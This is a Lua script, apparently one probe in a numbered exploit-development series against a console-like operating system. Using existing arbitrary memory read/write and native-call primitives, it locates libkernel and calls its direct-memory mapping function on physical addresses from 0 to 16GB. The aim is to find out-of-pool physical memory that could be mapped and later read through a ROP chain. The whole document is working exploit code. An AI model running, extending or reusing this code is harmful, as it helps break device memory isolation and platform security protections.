-- CRASH_CLASS: LOW
-- PROBE 561b: MapDM acceptance test — return value only, NO reads
--
-- 561a crashed because reading MapDM'd pages kills past pcall.
-- This probe ONLY checks if MapDM returns 0 (success) or error
-- for physical addresses outside the GPU pool (0-0x150000000).
--
-- If MapDM accepts out-of-pool addresses, we can use a child thread
-- ROP chain to read the data safely.

print("=== PROBE 561b: MapDM ACCEPT TEST ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rb(a)
    local d = rd(a); if d == nil then return nil end
    if d < 0 then d = d + 0x100000000 end; return d
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function zero(buf, n)
    for off = 0, n-4, 4 do
        pcall(function() memory.write_dword(buf + off, 0) end)
    end
end

local Z = uint64(0)
local sc6   = mk(6)
local sc20  = mk(20)
local sc73  = mk(73)
local sc477 = mk(477)
local sc593 = mk(593)

local pid = N(sc20())
print("pid=" .. pid)

-- Get libkernel base
local info = memory.alloc(0x200)
zero(info, 0x200)
wd(info, 0x160)
pcall(function() sc593(uint64(0x2001), info) end)
local lk_lo = rd(info + 0x108) or 0
local lk_hi = rd(info + 0x10C) or 0
if lk_lo < 0 then lk_lo = lk_lo + 0x100000000 end
if lk_hi < 0 then lk_hi = lk_hi + 0x100000000 end
local lk = uint64(string.format("0x%X%08X", lk_hi, lk_lo))
local mapdm_fn = lk + uint64(0x15020)
print(string.format("lk=0x%X%08X", lk_hi, lk_lo))
io.flush()

-- Strategy: for each physical address:
-- 1. mmap anonymous page at unique VA
-- 2. Call MapDM(VA, 0x4000, prot=3, flags=0, phys, align=0x4000)
-- 3. Record return value (DO NOT READ FROM VA!)
-- 4. munmap VA

local page_sz = 0x4000
local base_va = uint64("0x880000000")

-- Test 32 physical addresses: 0 to 16GB in 512MB steps
print("")
print("--- 512MB step scan (0 to 16GB) ---")
io.flush()

local accepted = {}

for gi = 0, 31 do
    local phys_lo = 0
    local phys_hi = 0

    -- Calculate phys = gi * 0x20000000
    -- gi * 512MB: each gi adds 0x20000000
    -- For gi 0-7: phys_hi=0, phys_lo = gi*0x20000000
    -- For gi 8-15: phys_hi=1, phys_lo = (gi-8)*0x20000000
    -- For gi 16-23: phys_hi=2, phys_lo = (gi-16)*0x20000000
    -- etc.
    phys_hi = math.floor(gi * 0x20000000 / 0x100000000)
    phys_lo = (gi * 0x20000000) % 0x100000000

    -- Handle Lua number precision for large values
    if gi >= 8 then
        phys_hi = math.floor(gi / 8)
        phys_lo = (gi % 8) * 0x20000000
    end

    local phys = uint64(string.format("0x%X%08X", phys_hi, phys_lo))
    local va = base_va + uint64(gi * page_sz * 2)

    -- Pre-map
    local ok_m = pcall(function()
        sc477(va, uint64(page_sz), uint64(3),
            uint64(0x1012), uint64(0xFFFFFFFF), Z)
    end)
    if not ok_m then
        print(string.format("[%2d] phys=0x%X%08X: pre-map fail", gi, phys_hi, phys_lo))
    else
        -- Call MapDM — DO NOT READ RESULT PAGE
        local ok_md, rv_md = pcall(function()
            return native.fcall_with_rax(mapdm_fn, 0,
                va, uint64(page_sz), uint64(3), Z, phys, uint64(page_sz))
        end)
        local md_rv = ok_md and N(rv_md) or -999
        if md_rv < 0 and md_rv > -100 then md_rv = md_rv end
        local md_rv_u = md_rv
        if md_rv_u < 0 then md_rv_u = md_rv_u + 0x100000000 end

        if md_rv == 0 then
            print(string.format("[%2d] phys=0x%X%08X: ACCEPTED (rv=0) ★", gi, phys_hi, phys_lo))
            accepted[#accepted + 1] = {phys_hi, phys_lo, gi}
        else
            print(string.format("[%2d] phys=0x%X%08X: REJECTED (rv=0x%X)", gi, phys_hi, phys_lo, md_rv_u))
        end

        -- Unmap (important — don't leave mapped pages we can't read)
        pcall(function() sc73(va, uint64(page_sz)) end)
    end

    io.flush()
end

print(string.format("\nACCEPTED: %d out of 32", #accepted))
for _, a in ipairs(accepted) do
    print(string.format("  0x%X%08X", a[1], a[2]))
end
io.flush()

-- ============================================================
-- FINE SCAN around accepted regions (64MB steps)
-- ============================================================
if #accepted > 0 then
    print("")
    print("--- Fine scan (64MB steps) ---")
    io.flush()

    for _, a in ipairs(accepted) do
        local a_hi = a[1]
        local a_lo = a[2]

        -- Scan -256MB to +256MB around accepted point
        for fi = -4, 4 do
            local f_lo = a_lo + fi * 0x4000000  -- 64MB
            local f_hi = a_hi
            while f_lo < 0 do f_lo = f_lo + 0x100000000; f_hi = f_hi - 1 end
            while f_lo >= 0x100000000 do f_lo = f_lo - 0x100000000; f_hi = f_hi + 1 end

            repeat
            if f_hi < 0 then break end

            local fphys = uint64(string.format("0x%X%08X", f_hi, f_lo))
            local fva = base_va + uint64((fi + 4 + 100) * page_sz * 2)

            pcall(function()
                sc477(fva, uint64(page_sz), uint64(3),
                    uint64(0x1012), uint64(0xFFFFFFFF), Z)
            end)

            local ok_f, rv_f = pcall(function()
                return native.fcall_with_rax(mapdm_fn, 0,
                    fva, uint64(page_sz), uint64(3), Z, fphys, uint64(page_sz))
            end)
            local frv = ok_f and N(rv_f) or -999
            local tag = frv == 0 and "OK" or "FAIL"
            if fi == -4 or fi == 4 or frv == 0 then
                print(string.format("  0x%X%08X: %s", f_hi, f_lo, tag))
            end

            pcall(function() sc73(fva, uint64(page_sz)) end)
            until true
        end
        io.flush()
    end
end

-- ============================================================
-- ALSO TEST: AllocateDirectMemory with start ABOVE pool
-- (already tested in 558n: error 0x80020023, but reconfirm)
-- ============================================================
print("")
print("--- AllocDM above pool ---")
io.flush()

local alloc_fn = lk + uint64(0x17EF0)
local pout = memory.alloc(8)
wq(pout, Z)

local ok_a, rv_a = pcall(function()
    return native.fcall_with_rax(alloc_fn, 0,
        uint64("0x150000000"), uint64("0x200000000"), uint64(0x4000),
        uint64(0x4000), Z, uint64(pout))
end)
local arv = ok_a and N(rv_a) or -999
if arv < 0 then arv = arv + 0x100000000 end
print(string.format("AllocDM(1.5G-2G): rv=0x%X", arv))

-- Try 0-16GB range
wq(pout, Z)
local ok_a2, rv_a2 = pcall(function()
    return native.fcall_with_rax(alloc_fn, 0,
        Z, uint64("0x400000000"), uint64(0x4000),
        uint64(0x4000), Z, uint64(pout))
end)
local arv2 = ok_a2 and N(rv_a2) or -999
local p_lo = rd(pout) or 0
local p_hi = rd(pout + 4) or 0
if p_lo < 0 then p_lo = p_lo + 0x100000000 end
if p_hi < 0 then p_hi = p_hi + 0x100000000 end
print(string.format("AllocDM(0-16G): rv=%d phys=0x%X%08X", arv2, p_hi, p_lo))
io.flush()

print("")
local pid2 = N(sc20())
print("pid=" .. pid2 .. (pid2 == pid and " OK" or " DEAD"))
print("=== 561b DONE ===")
